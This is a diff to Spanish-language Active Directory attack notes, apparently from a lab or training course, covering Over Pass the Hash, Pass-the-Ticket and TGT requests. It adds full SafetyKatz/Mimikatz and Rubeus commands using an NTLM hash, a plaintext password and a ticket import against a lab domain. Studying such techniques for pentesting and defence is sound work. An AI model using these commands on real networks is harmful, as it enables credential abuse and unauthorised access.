@@ -93,9 +93,26 @@ kerberos - data copy @ 0000013DECC9C6C8
 3. Se copia el *token* original.
 4. Similar a **runas /netonly** pero sin credenciales.
 
-En caso de obtener un **TGT** para contar con su **TGS**, no se requiere ser Administrador, porque el paquete de autenticación de Kerberos cuenta con mensajes que no requieren privilegios para su importación.
+La técnica de *Over Pass the Hash* implica la generación de un nuevo ticket de Kerberos y la importación de este ticket en la memoria del sistema, lo cual generalmente requiere privilegios de administrador.
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:juan /domain:cs.org /ntlm:709d4242de780b1f34c19c78ad1630fd /ptt"
 ```
 
 En este caso, se agrega el parámetro **/ptt** al comando de *Pass the Hash* anterior. Esto indica a Mimikatz que importe el ticket de Kerberos generado en la memoria del sistema para establecer una sesión de autenticación en lugar de solo realizar un *Pass the Hash*. Esto permite realizar la técnica de *Over Pass the Hash* y obtener acceso a otros recursos o sistemas dentro de la red.
+
+## Pass-the-Ticket
+
+El parámetro "asktgt" en Rubeus, se utiliza para solicitar un Ticket Granting Ticket (TGT) utilizando las credenciales de un usuario especificado. Y es psoible realizarlo de manera remota:
+```powershell
+C:\AD\Tools\Rubeus.exe asktgt /user:cs.org\juan /password:Colombia.2023. /dc:192.168.1.155
+# Para importar el *ticket*:
+C:\AD\Tools\Rubeus.exe ptt /ticket:doIFDjCCBQqgAw...
+```
+
+## ASK-TGT/TGS
+
+Se genera tráfico legítimo Kerberos para solicitar: AS-REQ TGS-REQ. ¡No necesita ser administrador!
+Para solicitar el TGT concociendo el *Hash* del usuario: 
+```powershell
+C:\AD\Tools\Rubeus.exe asktgt /user:juan /domain:cs.org /rc4:709d4242de780b1f34c19c78ad1630fd /dc:192.168.1.155 /ptt
+```
